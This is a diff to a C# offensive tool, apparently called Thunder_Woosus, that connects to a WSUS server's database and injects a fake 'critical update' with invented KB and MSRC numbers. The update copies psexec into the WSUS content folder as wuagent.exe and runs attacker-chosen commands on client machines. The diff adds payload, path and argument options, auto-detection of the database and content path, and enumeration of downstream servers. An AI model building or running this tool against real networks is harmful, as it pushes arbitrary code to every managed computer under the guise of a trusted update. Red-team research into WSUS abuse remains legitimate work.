@@ -109,11 +109,87 @@ namespace Thunder_Woosus
         public ClWSUS()
         {
             FvCheckSSL();
-            FvFullComputerName();            
+            FvFullComputerName();
+            FvOSDetails();
+            FvDatabaseBaseName();
+            FvContentDirectory();
+        }
+        public void FvContentDirectory()
+        {
+            //Next revision, we'll make this a generic function
+            string sContentDirectoryTemp = string.Empty;
+            sContentDirectoryTemp = RegistryWOW6432.GetRegKey64(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "ContentDir");
+            if (sContentDirectoryTemp == "ERROR_FILE_NOT_FOUND")
+            {
+                sContentDirectoryTemp = RegistryWOW6432.GetRegKey32(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "ContentDir");
+                if (sContentDirectoryTemp == "ERROR_FILE_NOT_FOUND")
+                {
+                    bWSUSInstalled = false;
+                    Console.WriteLine("Something went wrong, unable to detect SQL details from registry. Probably my fault");
+                    return;
+                }
+            }           
+            sContentDirectoryTemp = HEX2ASCII(sContentDirectoryTemp);
+            sContentDirectoryTemp = ReverseString(sContentDirectoryTemp);
+            sLocalContentCacheLocation = Environment.ExpandEnvironmentVariables(sContentDirectoryTemp);
+            return;
         }
         public void FvFullComputerName()
         {            
             sComputerName = Dns.GetHostEntry("LocalHost").HostName;
+        }
+        public void FvDatabaseBaseName()
+        {
+            //Next revision, we'll make this a generic function
+            string sDBServerTemp = string.Empty;                      
+            sDBServerTemp = RegistryWOW6432.GetRegKey64(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "SqlServerName");
+            if (sDBServerTemp == "ERROR_FILE_NOT_FOUND")
+            {
+                sDBServerTemp = RegistryWOW6432.GetRegKey32(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "SqlServerName");
+                if (sDBServerTemp == "ERROR_FILE_NOT_FOUND")
+                {
+                    bWSUSInstalled = false;
+                    Console.WriteLine("Something went wrong, unable to detect SQL details from registry. Probably my fault");
+                    return;
+                }
+            }
+            sDBServerTemp = HEX2ASCII(sDBServerTemp);
+            sDatabaseInstance = ReverseString(sDBServerTemp);
+
+            //So Painful
+            string sDBNameTemp = string.Empty; //I know            
+            sDBNameTemp = RegistryWOW6432.GetRegKey64(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "SqlDatabaseName");
+            if (sDBNameTemp == "ERROR_FILE_NOT_FOUND")
+            {
+                sDBNameTemp = RegistryWOW6432.GetRegKey32(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Update Services\Server\setup", "SqlDatabaseName");
+                if (sDBNameTemp == "ERROR_FILE_NOT_FOUND")
+                {
+                    bWSUSInstalled = false;
+                    Console.WriteLine("Something went wrong, unable to detect SQL details from registry. Probably my fault");
+                    return;
+                }
+            }
+            sDBNameTemp = HEX2ASCII(sDBNameTemp);
+            sDatabaseName = ReverseString(sDBNameTemp);
+            return;
+        }
+        public void FvOSDetails()
+        {
+            string sOSTemp = string.Empty; //I know
+            sOSTemp = RegistryWOW6432.GetRegKey64(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
+            if (sOSTemp == "ERROR_FILE_NOT_FOUND")
+            {
+                sOSTemp = RegistryWOW6432.GetRegKey32(RegHive.HKEY_LOCAL_MACHINE, @"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
+                if (sOSTemp == "ERROR_FILE_NOT_FOUND")
+                {
+                    bWSUSInstalled = false;
+                    Console.WriteLine("Something went wrong, unable to detect OS version. Probably my fault");
+                    return;
+                }
+            }
+            //So much Jank!
+            sOSTemp = HEX2ASCII(sOSTemp);
+            sOS = ReverseString(sOSTemp);
         }
         public void FvCheckSSL()
         {
@@ -138,12 +214,25 @@ namespace Thunder_Woosus
                 bSSL = false;
             }
         }
-        public static string ByteArrayToString(byte[] ba)
+        //https://stackoverflow.com/questions/17637950/convert-string-of-hex-to-string-of-little-endian-in-c-sharp       
+        public string HEX2ASCII(string hex)
         {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
-            foreach (byte b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
+            string res = String.Empty;
+            for (int a = 0; a < hex.Length; a = a + 2)
+            {
+                string Char2Convert = hex.Substring(a, 2);
+                int n = Convert.ToInt32(Char2Convert, 16);
+                char c = (char)n;
+                res += c.ToString();
+            }
+            return res;
+        }
+        //https://www.dotnetperls.com/reverse-string
+        public static string ReverseString(string s)
+        {
+            char[] arr = s.ToCharArray();
+            Array.Reverse(arr);
+            return new string(arr);
         }
     } 
     public class ClGuid
@@ -170,7 +259,7 @@ namespace Thunder_Woosus
 
         public ClFile(string sPFileName, string sPFilePath, string sPArgs, string sContentLocation, bool bPCopyFile)
         {
-            Console.WriteLine(sContentLocation);
+            //Console.WriteLine(sContentLocation);
             sFileName = sPFileName;
             sFilePath = sPFilePath;            
             sArgs = HttpUtility.HtmlEncode(HttpUtility.HtmlEncode(sPArgs));
@@ -186,8 +275,8 @@ namespace Thunder_Woosus
         {
             try
             {
-                Console.WriteLine(sFilePath);
-                Console.WriteLine(sContentLocation);
+                //Console.WriteLine(sFilePath);
+                //Console.WriteLine(sContentLocation);
                 File.Copy(sFilePath, sContentLocation + @"\wuagent.exe");
                 return true;
             }
@@ -221,9 +310,17 @@ namespace Thunder_Woosus
         public bool bEnumDS = false;
         public bool bTargetComputer = false;
         public bool bManualApproval = false;
-        public bool bDeleteUpdate = false;
+        public bool bDeleteUpdate = false;        
+        public bool bFilePath = false;
+        public bool bArgs = false;
+        public bool bPayload = false;
+        public bool bLocalPath = false;
         public string sBundleGUID = string.Empty;
         public string sCliTargetComputer = string.Empty;
+        public string sCliPayload = string.Empty;
+        public string sCliFileName = string.Empty;
+        public string sCliFilePath = string.Empty;
+        public string sCliArgs = string.Empty;
         public ClCLI()
         {
             Console.WriteLine("############################# WSUSTool #############################");            
@@ -233,8 +330,7 @@ namespace Thunder_Woosus
         public bool FbCLIInterface(string[] args)
         {           
             if (args.Length == 0)
-            {
-                FvPrintUsage();
+            {           
                 return false;
             }
             for(int i = 0; i < args.Length; i++)
@@ -245,21 +341,22 @@ namespace Thunder_Woosus
                         bVerbose = true;
                         break;
                     case "-enumeratecomputers":
-                        Console.WriteLine("Enumerating WSUS Client Computers");
+                        Console.WriteLine("Enumerating WSUS client computers.");
                         bEnumComps = true;
                         break;
-                    /*case "-enumeratedownstream":
-                        Console.WriteLine("Enumerating Downstream Servers");
+                    case "-enumeratedownstream":
+                        Console.WriteLine("Enumerating downstream servers.");
                         bEnumDS = true;
                         break;
+                        /*
                     case "-targetcomputer":
                         Console.WriteLine("Targeting Single System with FQDN");
                         bTargetComputer = true;
                         sCliTargetComputer = args[i + 1];
-                        break;
+                        break;                       
                         */
                     case "-manualapproval":
-                        Console.WriteLine("Injecting Update for Manual Targeting");
+                        Console.WriteLine("Injecting update for manual targeting.");
                         bManualApproval = true;                        
                         break;
                     case "-deleteupdate":
@@ -267,18 +364,54 @@ namespace Thunder_Woosus
                         bDeleteUpdate = true;
                         sBundleGUID = args[i + 1];
                         break;
-                }
+                    case "-payload":                                                
+                        sCliPayload = args[i + 1].ToLower();
+                        if(sCliPayload == "psexec")
+                        {                           
+                            bPayload = true;
+                        }
+                        break;
+                    case "-args":
+                        sCliArgs = args[i + 1].Replace("'","\"");                       
+                        bArgs = true;
+                        break;
+                    case "-localpath":
+                        sCliFilePath = args[i + 1];
+                        sCliFileName = System.IO.Path.GetFileName(sCliFilePath);
+                        bLocalPath = true;
+                        break;
+                }               
             }
+            if (bManualApproval == true)
+            {
+                if (bArgs == true && bPayload == true && bLocalPath == true)
+                {
+                    if(sCliPayload == "psexec")
+                    {
+                        if(sCliFileName.ToLower() != "psexec.exe")
+                        {
+                            Console.WriteLine("Rename the filename to psexec.exe");
+                            return false;
+                        }
+                    }
+                    Console.WriteLine("Using {0} locally located at {1}", sCliFileName, sCliFilePath);
+                    return true;
+                }
+                else
+                {
+                    Console.WriteLine("Deploying update requires payload, local path, and arguments.");
+                    return false;
+                }
+            }            
             return true;
         }
         public void FvPrintUsage()
         {
-            Console.WriteLine("############################# Usage ################################");
+            Console.WriteLine("\r\n############################# Usage ################################");
             Console.WriteLine("Enumerate All WSUS Clients:\t\tThunder_Woosus.exe -EnumerateComputers");
-            //Console.WriteLine("Enumerate Downstream Servers:\t\tThunder_Woosus.exe -EnumerateDownStream");
-            Console.WriteLine("Enable Verbosity:\t\t\tThunder_Woosus.exe -Verbose");
+            Console.WriteLine("Enumerate Downstream Servers:\t\tThunder_Woosus.exe -EnumerateDownstream");             
             //Console.WriteLine("Target Computer with FQDN:\t\tThunder_Woosus.exe -TargetComputer testmachine.testdomain.local");
-            Console.WriteLine("Manually Target Systems:\t\tThunder_Woosus.exe -ManualApproval");
+            Console.WriteLine("Manually Target Systems:\t\tThunder_Woosus.exe -ManualApproval -Payload psexec -LocalPath \"C:\\windows\\temp\\psexec.exe\" -Args \"-d -accepteula cmd.exe /c 'echo testing123 > c:\\cpl.txt'\"");
             Console.WriteLine("Delete Target Update:\t\t\tThunder_Woosus.exe -DeleteUpdate *BundleID*");
         }
     }
@@ -302,11 +435,28 @@ namespace Thunder_Woosus
         public static StUpdate stUpdateData = new StUpdate();
         public static ClCLI clCLI = new ClCLI();
         static SqlConnection FsqlConnection()
-        {
+        {            
             SqlConnection sqlcQuery = new SqlConnection();
-            sqlcQuery.ConnectionString = "Server=np:\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query;Database=SUSDB;Integrated Security=True";
-            //Win 2008
-            //sqlcQuery.ConnectionString = "Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database=SUSDB;Integrated Security=True";
+            if(clWSUSData.sOS.Contains("Server 2008"))
+            {
+                //No Windows 2008 WSUS Server in the lab. Going to leave the SQL instance hardcoded.
+                sqlcQuery.ConnectionString = @"Server=np:\\.\pipe\MSSQL$MICROSOFT##SSEE\sql\query;Database=" + clWSUSData.sDatabaseName + @";Integrated Security=True";
+            }
+            //'Server=np:\\.\pipe\MICROSOFT##WID\tsql\query;Database=SUSDB;Integrated Security=True'
+            else if (clWSUSData.sOS.Contains("Server 2012"))
+            {
+                sqlcQuery.ConnectionString = @"Server=np:\\.\pipe\" + clWSUSData.sDatabaseInstance + @"\tsql\query;Database=" + clWSUSData.sDatabaseName + @";Integrated Security=True";
+            }
+            else if (clWSUSData.sOS.Contains("Server 2016"))
+            {
+                sqlcQuery.ConnectionString = @"Server=np:\\.\pipe\" + clWSUSData.sDatabaseInstance + @"\tsql\query;Database=" + clWSUSData.sDatabaseName + @"; Integrated Security=True";
+            }
+            else
+            {
+                Console.WriteLine("Issue while detecting OS in the FsqlConnection, could be an issue with the OS could be my fault. We are checking for 2008, 2012, 2016.");
+                return null;
+            }                
+            
             try
             {
                 sqlcQuery.Open();                
@@ -427,6 +577,30 @@ namespace Thunder_Woosus
             catch
             {
                 Console.WriteLine("\r\nFunction error - FbEnumAllComputers.");
+            }
+            return false;
+        }
+        static bool FbEnumDownStream(SqlCommand sqlCommFun)
+        {
+            SqlDataReader sqldrReader;
+            sqlCommFun.CommandText = "exec spGetAllDownstreamServers";
+            try
+            {
+                Console.WriteLine("####################### Downstream Server Enumeration #######################");
+                Console.WriteLine("ComputerName, OSVersion, LastCheckInTime");
+                Console.WriteLine("---------------------------------------------------");
+                sqldrReader = sqlCommFun.ExecuteReader();
+                int count = sqldrReader.FieldCount;
+                while (sqldrReader.Read())
+                {
+                    Console.WriteLine("{0}, {1}, {2}", sqldrReader.GetValue(sqldrReader.GetOrdinal("AccountName")), sqldrReader.GetValue(sqldrReader.GetOrdinal("Version")), sqldrReader.GetValue(sqldrReader.GetOrdinal("RollupLastSyncTime")));
+                }
+                sqldrReader.Close();
+                return true;
+            }
+            catch
+            {
+                Console.WriteLine("\r\nFunction error - FbEnumDownStream.");
             }
             return false;
         }
@@ -694,13 +868,14 @@ namespace Thunder_Woosus
             }
             sqldrReader.Close();
             return true;
-        }
+        }      
         static void Main(string[] args)
         {
             try
-            {                
-                if(!clCLI.FbCLIInterface(args))
+            {
+                if (!clCLI.FbCLIInterface(args))
                 {
+                    clCLI.FvPrintUsage();
                     return;
                 }
                 if (clWSUSData.bWSUSInstalled == false)
@@ -718,7 +893,7 @@ namespace Thunder_Woosus
                     }
                     if(clCLI.bEnumDS == true)
                     {
-                        //Enum DS Servers
+                        FbEnumDownStream(sqlComm);
                     }
                     if(clCLI.bDeleteUpdate == true)
                     {
@@ -731,15 +906,15 @@ namespace Thunder_Woosus
                     {
                         /////
                         //ClFile(filename, local filepath, arguments, copy file to WSUS\Content?, WSUS Content Path)
-                        //Todo - Dynamically detect WSUS content path, it's in registry
-                        ClFile clFileData = new ClFile("psexec.exe", @"c:\temp\psexec.exe", @"-d -accepteula cmd.exe /c ""c:\windows\system32\calc.exe""", @"C:\program files\update services\WsusContent", true);
+                        //Todo - Dynamically detect WSUS content path, it's in registry                        
+                        ClFile clFileData = new ClFile(clCLI.sCliFileName, clCLI.sCliFilePath, clCLI.sCliArgs, clWSUSData.sLocalContentCacheLocation, true);
                         /////
                         /////
                         //If you're going to use single quotes in title, description, or anywhere below, use two or it won't work correctly
                         //For example, we''re going phishing.
                         /////
                         stUpdateData.sTitle = "Windows Super Awesome Critical Update for Super Fun Times (KB1234567)";
-                        stUpdateData.sReleaseDate = @"2018-10-08T17:00:00.000Z";
+                        stUpdateData.sReleaseDate = @"2018-11-02T17:00:00.000Z";
                         stUpdateData.sClassification = "Critical";
                         stUpdateData.sMSRCNumber = "MS18-123";
                         stUpdateData.sKBNumbers = "1234567";
@@ -791,6 +966,7 @@ namespace Thunder_Woosus
             catch
             {
                 Console.WriteLine("\r\nFunction error - Main.");
+                Console.WriteLine("Does {0} exist on your local target?", clCLI.sCliFilePath);
             }
         }
     }
